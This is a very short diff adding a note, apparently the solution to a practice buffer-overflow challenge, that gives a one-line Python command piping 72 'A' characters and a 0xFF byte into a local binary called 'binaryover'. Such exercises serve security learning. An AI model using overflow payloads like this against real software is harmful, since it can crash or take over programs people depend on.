@@ -1,0 +1,4 @@
+This is a question based on buffer overflow.
+To solve use this command to overflow the buffer stack:
+
+python -c 'print "A"*72 + "\xFF" ' | ./binaryover
